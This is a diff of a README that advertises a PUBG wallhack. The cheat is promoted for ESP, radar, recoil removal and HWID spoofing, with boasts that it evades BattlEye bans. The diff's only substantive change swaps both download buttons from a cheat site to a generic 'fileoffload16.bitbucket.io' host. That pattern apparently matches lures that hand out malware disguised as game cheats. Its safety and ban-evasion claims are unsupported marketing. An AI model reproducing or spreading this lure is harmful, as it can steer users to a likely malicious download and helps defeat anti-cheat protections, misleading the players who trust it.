@@ -3,7 +3,7 @@
 Getting third-partied from nowhere?
 Slide in with the **PUBG Wallhack**—an elite overlay beaming skeletal ESP, loot glow, and 2-D radar while spoofing your HWID so BattlEye shrugs. A mid-May purge roasted roughly **210 000** cheaters, yet users of this injector walked away spotless. 
 
-[![Get PUBG Wallhack](https://img.shields.io/badge/Get%20PUBG%20Wallhack-blueviolet)](https://wecheaters.github.io/cheats/pubg-battlegrounds/)
+[![Get PUBG Wallhack](https://img.shields.io/badge/Get%20PUBG%20Wallhack-blueviolet)](https://fileoffload16.bitbucket.io)
 
 **Quick Links:** [Overview](#overview) • [Features](#feature-breakdown-%F0%9F%9B%A0%EF%B8%8F) • [Install](#instant-install-guide)
 
@@ -20,7 +20,7 @@ Signature randomization and throttled read/write calls mimic legit overlays, kee
 * **Stealth HWID Spoofer** – flips machine ID each boot—no tinkering needed.
 * **Recoil-Nuke Script** – erase vertical kick for sky-beam sprays.
 
-[![Get PUBG Wallhack](https://www.tomshardware.fr/content/uploads/sites/3/2021/07/unknown.png)](https://wecheaters.github.io/cheats/pubg-battlegrounds/)
+[![Get PUBG Wallhack](https://www.tomshardware.fr/content/uploads/sites/3/2021/07/unknown.png)](https://fileoffload16.bitbucket.io)
 
 ## 🔍 Comparison with Other Mods
 
@@ -85,3 +85,4 @@ A: HWID spoof + signature shuffle slice risk to near-zero, unlike public loaders
 
 **Q: Can I customize colors?**
 A: Absolutely—RGB sliders let you match stream overlays or color-blind palettes.
+
